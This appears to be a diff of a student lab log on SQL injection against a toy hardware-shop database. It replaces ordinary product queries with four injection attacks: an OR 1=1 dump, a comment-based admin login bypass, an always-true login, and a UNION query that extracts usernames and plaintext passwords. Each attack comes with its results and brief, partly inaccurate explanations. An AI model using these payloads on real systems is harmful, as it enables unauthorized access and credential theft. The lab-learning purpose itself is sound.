@@ -1,12 +1,12 @@
-Martha Kwaga, 123456789, 21/04/2026
-
- Query A: All columns for all products ---
-[
+ATTACK 1: Dump all products
+--- Executing Query ---
+Query: SELECT * FROM products WHERE name LIKE '%' OR 1=1--%'
+Result: [
   {
     id: 1,
     name: 'Cement (bag)',
     description: 'Portland cement 50kg bag',
-    price: 35000
+    price: 38000
   },
   {
     id: 2,
@@ -34,87 +34,69 @@ Martha Kwaga, 123456789, 21/04/2026
   }
 ]
 
---- Query B: Name and price only ---
-[
-  { name: 'Cement (bag)', price: 35000 },
-  { name: 'Iron Sheet 3m', price: 110000 },
-  { name: 'Paint 5L', price: 60000 },
-  { name: 'Nails 1kg', price: 12000 },
-  { name: 'Timber 2x4', price: 25000 }
-]
+//WHY IT WORKED?
+There was no strict equality validation set leaving it open to possible answers.
 
---- Query C: Product with ID 3 ---
-{
-  id: 3,
-  name: 'Paint 5L',
-  description: 'Exterior wall paint white 5L',
-  price: 60000
-}
+ATTACK 2: Login bypass (admin)
+--- Executing Login Query ---
+Query: SELECT * FROM users WHERE username='admin'--' AND password='a
+nything'
+Result: { id: 1, username: 'admin', password: 'admin123', role: 'adm
+in' } 
 
---- Query D: Products containing 'sheet' ---
-[
+//WHY IT WORKED?
+Again no strict condition has been set.
+
+ATTACK 3: Always true login
+--- Executing Login Query ---
+Query: SELECT * FROM users WHERE username='' OR '1'='1' AND password
+='' OR '1'='1'
+Result: { id: 1, username: 'admin', password: 'admin123', role: 'adm
+in' } 
+
+//WHY IT WORKED?
+No condition was set for the false boolean.
+
+ATTACK 4: UNION attack (Steal passwords)
+--- Executing Query ---
+Query: SELECT * FROM products WHERE name LIKE '%' UNION SELECT id, u
+sername, password, role FROM users--%'
+Result: [
   {
-    id: 2,
-    name: 'Iron Sheet 3m',
-    description: 'Gauge 30 roofing sheet 3m long',
-    price: 110000
-  }
-]
-
---- Query E: Sorted by price (highest first) ---
-[
+    id: 1,
+    name: 'Cement (bag)',
+    description: 'Portland cement 50kg bag',
+    price: 38000
+  },
+  { id: 1, name: 'admin', description: 'admin123', price: 'admin' },
   {
     id: 2,
     name: 'Iron Sheet 3m',
     description: 'Gauge 30 roofing sheet 3m long',
     price: 110000
   },
+  { id: 2, name: 'fatuma', description: 'pass456', price: 'attendant
+' },
   {
     id: 3,
     name: 'Paint 5L',
     description: 'Exterior wall paint white 5L',
     price: 60000
   },
+  { id: 3, name: 'wasswa', description: 'pass789', price: 'manager'
+},
   {
-    id: 1,
-    name: 'Cement (bag)',
-    description: 'Portland cement 50kg bag',
-    price: 35000
+    id: 4,
+    name: 'Nails 1kg',
+    description: 'Common wire nails 1kg pack',
+    price: 12000
   },
   {
     id: 5,
     name: 'Timber 2x4',
     description: 'Pine timber plank 2x4 per metre',
     price: 25000
-  },
-  {
-    id: 4,
-    name: 'Nails 1kg',
-    description: 'Common wire nails 1kg pack',
-    price: 12000
   }
 ]
-
---- Query F: 2 most expensive products ---
-[
-  {
-    id: 2,
-    name: 'Iron Sheet 3m',
-    description: 'Gauge 30 roofing sheet 3m long',
-    price: 110000
-  },
-  {
-    id: 3,
-    name: 'Paint 5L',
-    description: 'Exterior wall paint white 5L',
-    price: 60000
-  }
-]
-
---- Query G: Update Cement price and verify ---
-{
-  id: 1,
-  name: 'Cement (bag)',
-  description: 'Portland cement 50kg bag',
-  price: 38000
-}
+//WHY IT WORKED?
+The input for passwords needs to be left empty and not retrievable data. Condition was set to return password which shouldn't be the case.
